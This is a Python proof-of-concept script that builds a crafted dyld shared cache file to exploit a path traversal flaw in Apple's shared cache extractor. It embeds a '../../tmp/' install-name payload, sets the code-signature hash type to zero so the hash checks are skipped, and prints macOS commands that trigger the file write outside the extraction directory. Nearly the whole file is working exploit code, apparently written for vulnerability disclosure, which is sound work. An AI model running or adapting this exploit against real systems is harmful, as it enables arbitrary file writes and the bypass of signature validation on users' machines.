#!/usr/bin/env python3
"""
PoC Generator — DSC-EXTRACTOR-TRAVERSAL-1
CWE-22 Path Traversal in dyld dsc_extractor.cpp / DyldSharedCache.cpp

BUG:
  SharedCacheDylibExtractor::extractCache() does:
      strcat(dylib_path, name);       // 'name' = installName from cache pathFileOffset
  where 'name' is an attacker-controlled string read from dylibs[i].pathFileOffset
  with no sanitization of '..' components.

EFFECT:
  Running:
      dyld_shared_cache_util -extract <malicious_cache> /tmp/safe_out
  writes a file (with dylib content) to:
      /tmp/safe_out/../../tmp/poc_dsc_traversal_proof
    = /tmp/poc_dsc_traversal_proof
  i.e., OUTSIDE the requested extraction directory.

Usage:
  python3 gen_malicious_dsc.py [outfile]
  # Default output: malicious.cache
"""

import struct
import sys
import hashlib

# ── tunables ─────────────────────────────────────────────────────────────────
FILE_SIZE         = 0x4000          # 16 KB total
BASE_ADDR         = 0x100000000     # x86_64 shared-cache base VM address

MAPPING_OFFSET    = 0x240           # file offset → dyld_cache_mapping_info[0]
IMAGES_OFFSET     = 0x260           # file offset → dyld_cache_image_info[0]
PATH_OFFSET       = 0x280           # file offset → install-name string (TRAVERSAL)
MACHO_OFFSET      = 0x400           # file offset → Mach-O header of the fake dylib
CS_OFFSET         = 0x3000          # file offset → code-signature blob

MACHO_VM_ADDR     = BASE_ADDR + MACHO_OFFSET   # VM address of the image entry

# The traversal payload.  Extraction dir + "/" + this → path outside outdir.
# e.g. outdir=/tmp/safe_out → final path /tmp/safe_out/../../tmp/poc_dsc_traversal_proof
#                                       = /tmp/poc_dsc_traversal_proof
TRAVERSAL_PATH    = "../../tmp/poc_dsc_traversal_proof"

# ── helper: write little-endian integers ────────────────────────────────────
def p8(b, off, v):  b[off:off+1]  = struct.pack("<B", v)
def p32(b, off, v): b[off:off+4]  = struct.pack("<I", v)
def p64(b, off, v): b[off:off+8]  = struct.pack("<Q", v)
# big-endian helpers for code-signature (Apple CS structs are network byte order)
def p32be(b, off, v): b[off:off+4] = struct.pack(">I", v)

# ─────────────────────────────────────────────────────────────────────────────
def build():
    buf = bytearray(FILE_SIZE)

    # ── dyld_cache_header ────────────────────────────────────────────────────
    # magic[16]  (offset 0)
    buf[0:16] = b"dyld_v1  x86_64\x00"

    # offset 16: mappingOffset (uint32)
    # Value 0x240=576 ≥ offsetof(header, imagesCount)=452
    #   → imagesOffset/imagesCount (new fields) are used
    # Value 0x240=576 ≥ offsetof(header, subCacheArrayCount)=396
    #   → mappedSize() uses sharedRegionSize; subCacheArrayCount checked next
    p32(buf, 16, MAPPING_OFFSET)        # mappingOffset = 0x240

    # offset 20: mappingCount (uint32)
    p32(buf, 20, 1)                     # one mapping entry

    # offsets 24,28: imagesOffsetOld / imagesCountOld — unused (new-format cache)

    # offset 40: codeSignatureOffset (uint64)
    p64(buf, 40, CS_OFFSET)

    # offset 232: sharedRegionSize (uint64)  — returned by mappedSize()
    # Must be non-zero or dyld_shared_cache_extract_dylibs_progress() returns early.
    p64(buf, 232, FILE_SIZE)

    # offset 392: subCacheArrayOffset (uint32) — 0 → no sub-caches
    # offset 396: subCacheArrayCount  (uint32) — 0 → no sub-caches (skips sub-cache loop)
    #   (already zero in zeroed buffer)

    # offset 448: imagesOffset (uint32)  — pointer to image_info table
    p32(buf, 448, IMAGES_OFFSET)
    # offset 452: imagesCount  (uint32)
    p32(buf, 452, 1)

    # ── dyld_cache_mapping_info @ MAPPING_OFFSET ─────────────────────────────
    # struct { uint64_t address; uint64_t size; uint64_t fileOffset;
    #          uint32_t maxProt; uint32_t initProt; }  = 32 bytes
    #
    # CRITICAL: fileOffset MUST BE 0.
    # forEachImage() checks:  if ( mappings[0].fileOffset != 0 ) return;
    p64(buf, MAPPING_OFFSET +  0, BASE_ADDR)   # address = 0x100000000
    p64(buf, MAPPING_OFFSET +  8, FILE_SIZE)   # size    = 0x4000 (covers full file)
    p64(buf, MAPPING_OFFSET + 16, 0)           # fileOffset = 0  ← CRITICAL
    p32(buf, MAPPING_OFFSET + 24, 7)           # maxProt  = rwx
    p32(buf, MAPPING_OFFSET + 28, 5)           # initProt = rx

    # ── dyld_cache_image_info @ IMAGES_OFFSET ────────────────────────────────
    # struct { uint64_t address; uint64_t modTime; uint64_t inode;
    #          uint32_t pathFileOffset; uint32_t pad; }  = 32 bytes
    #
    # address: VM address of the Mach-O header inside the cache.
    #   forEachImage() computes: offset = dylibs[i].address - mappings[0].address
    #                         → hdr    = (UnsafeHeader*)((char*)cache + offset)
    # So  MACHO_VM_ADDR = BASE_ADDR + MACHO_OFFSET → hdr points to our Mach-O.
    p64(buf, IMAGES_OFFSET +  0, MACHO_VM_ADDR)  # address  = 0x100000400
    p64(buf, IMAGES_OFFSET +  8, 0)              # modTime  = 0
    p64(buf, IMAGES_OFFSET + 16, 0)              # inode    = 0
    p32(buf, IMAGES_OFFSET + 24, PATH_OFFSET)    # pathFileOffset → traversal string
    p32(buf, IMAGES_OFFSET + 28, 0)              # pad      = 0

    # ── Traversal install-name string @ PATH_OFFSET ───────────────────────────
    # This is what gets strcat()'d into dylib_path without sanitization.
    path_bytes = TRAVERSAL_PATH.encode() + b'\x00'
    buf[PATH_OFFSET : PATH_OFFSET + len(path_bytes)] = path_bytes

    # ── Mach-O header @ MACHO_OFFSET ─────────────────────────────────────────
    # mach_header_64  (32 bytes)
    MH_MAGIC_64        = 0xFEEDFACF
    CPU_TYPE_X86_64    = 0x01000007
    CPU_SUBTYPE_ALL    = 3
    MH_DYLIB           = 6
    LC_SEGMENT_64      = 0x19

    p32(buf, MACHO_OFFSET +  0, MH_MAGIC_64)       # magic
    p32(buf, MACHO_OFFSET +  4, CPU_TYPE_X86_64)   # cputype
    p32(buf, MACHO_OFFSET +  8, CPU_SUBTYPE_ALL)   # cpusubtype
    p32(buf, MACHO_OFFSET + 12, MH_DYLIB)          # filetype (≤12 required)
    p32(buf, MACHO_OFFSET + 16, 1)                 # ncmds = 1
    p32(buf, MACHO_OFFSET + 20, 72)                # sizeofcmds = 72 (one LC_SEGMENT_64)
    p32(buf, MACHO_OFFSET + 24, 0)                 # flags
    p32(buf, MACHO_OFFSET + 28, 0)                 # reserved

    # LC_SEGMENT_64  (72 bytes, no sections)
    # Placed immediately after mach_header_64
    S = MACHO_OFFSET + 32                          # segment command start
    p32(buf, S +  0, LC_SEGMENT_64)                # cmd
    p32(buf, S +  4, 72)                           # cmdsize
    buf[S + 8 : S + 24] = b"__TEXT\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"  # segname[16]
    p64(buf, S + 24, MACHO_VM_ADDR)                # vmaddr = 0x100000400
    p64(buf, S + 32, 0x100)                        # vmsize = 256 bytes
    p64(buf, S + 40, 0)                            # fileoff (within dylib) = 0
    p64(buf, S + 48, 0x100)                        # filesize = 256 bytes
    p32(buf, S + 56, 5)                            # maxprot  = r-x
    p32(buf, S + 60, 5)                            # initprot = r-x
    p32(buf, S + 64, 0)                            # nsects = 0
    p32(buf, S + 68, 0)                            # flags = 0

    # ── Code Signature @ CS_OFFSET ───────────────────────────────────────────
    # sharedCacheIsValid() validates:
    #   1. magic == CSMAGIC_EMBEDDED_SIGNATURE
    #   2. CS_CodeDirectory magic == CSMAGIC_CODEDIRECTORY
    #   3. nCodeSlots ≥ ceil(inBbufferSize / pageSize)
    #      inBbufferSize = mapping[0].size = 0x4000; pageSize = 4096 → need ≥ 4 slots
    #   4. hashType — if not SHA1/SHA256 → dscDigestFormat = kCCDigestNone
    #                                     → hash-per-slot loop is SKIPPED entirely
    # By setting hashType=0, we bypass all actual hash verification.
    # All CS fields are big-endian (network byte order).

    CSMAGIC_EMBEDDED_SIGNATURE = 0xFADE0CC0
    CSMAGIC_CODEDIRECTORY      = 0xFADE0C02
    CSSLOT_CODEDIRECTORY       = 0

    # Layout within CS blob (offsets from CS_OFFSET):
    #   0..11  : CS_SuperBlob  (magic[4] + length[4] + count[4])
    #   12..19 : CS_BlobIndex[0]  (type[4] + offset[4])   offset=20
    #   20..199: CS_CodeDirectory  (180 bytes)
    #     20..23:  magic
    #     24..27:  length  (= 180)
    #     28..31:  version (0x20100)
    #     32..35:  flags
    #     36..39:  hashOffset (from start of CD = 52)
    #     40..43:  identOffset
    #     44..47:  nSpecialSlots (0)
    #     48..51:  nCodeSlots (4)
    #     52..55:  codeLimit (0x3000 = CS_OFFSET)
    #     56:      hashSize (32)
    #     57:      hashType (0 → bypass hash loop)
    #     58:      platform (0)
    #     59:      pageSize (12 → 4096-byte pages)
    #     60..63:  spare2
    #     64..67:  scatterOffset  (version ≥ 0x20100)
    #     68..195: 128 bytes of zero hash slots (4 × 32)

    CD_LEN    = 180          # length of CS_CodeDirectory + hash slots
    SB_LEN    = 12 + 8 + CD_LEN   # CS_SuperBlob (12) + CS_BlobIndex (8) + CD

    C = CS_OFFSET
    # CS_SuperBlob
    p32be(buf, C +  0, CSMAGIC_EMBEDDED_SIGNATURE)
    p32be(buf, C +  4, SB_LEN)
    p32be(buf, C +  8, 1)                          # count = 1

    # CS_BlobIndex[0]
    p32be(buf, C + 12, CSSLOT_CODEDIRECTORY)       # type
    p32be(buf, C + 16, 20)                         # offset from start of SuperBlob → CD

    # CS_CodeDirectory @ C+20
    CD = C + 20
    p32be(buf, CD +  0, CSMAGIC_CODEDIRECTORY)
    p32be(buf, CD +  4, CD_LEN)                    # length of CD + hash slots
    p32be(buf, CD +  8, 0x20100)                   # version
    p32be(buf, CD + 12, 0)                         # flags
    p32be(buf, CD + 16, 52)                        # hashOffset (bytes from CD start to slots)
    p32be(buf, CD + 20, 0)                         # identOffset
    p32be(buf, CD + 24, 0)                         # nSpecialSlots
    p32be(buf, CD + 28, 4)                         # nCodeSlots ≥ ceil(0x4000/4096)=4
    p32be(buf, CD + 32, CS_OFFSET)                 # codeLimit = 0x3000
    p8(buf,  CD + 36, 32)                          # hashSize = 32
    p8(buf,  CD + 37,  0)                          # hashType = 0 → skips hash loop ✓
    p8(buf,  CD + 38,  0)                          # platform
    p8(buf,  CD + 39, 12)                          # pageSize = 2^12 = 4096
    p32be(buf, CD + 40, 0)                         # spare2
    p32be(buf, CD + 44, 0)                         # scatterOffset (v0x20100)
    # 128 bytes of hash slots (zeroed, never verified because hashType=0)

    out = sys.argv[1] if len(sys.argv) > 1 else "malicious.cache"
    with open(out, 'wb') as f:
        f.write(buf)

    print(f"[+] Malicious dyld shared cache written → {out}  ({FILE_SIZE} bytes)")
    print(f"[+] Embedded traversal install name: \"{TRAVERSAL_PATH}\"")
    print()
    print("=== To trigger the vulnerability on macOS ===")
    print()
    print(f"  OUTDIR=/tmp/dsc_poc_out_$$")
    print(f"  mkdir -p \"$OUTDIR\"")
    print(f"  /usr/bin/dyld_shared_cache_util -extract {out} \"$OUTDIR\" 2>&1 || true")
    print()
    print(f"  # Expected traversal target:")
    print(f"  ls -la /tmp/poc_dsc_traversal_proof")
    print()
    print("  If the file exists OUTSIDE $OUTDIR → CWE-22 path traversal confirmed.")
    print()
    print(f"  SHA-256: {hashlib.sha256(buf).hexdigest()}")

if __name__ == '__main__':
    build()
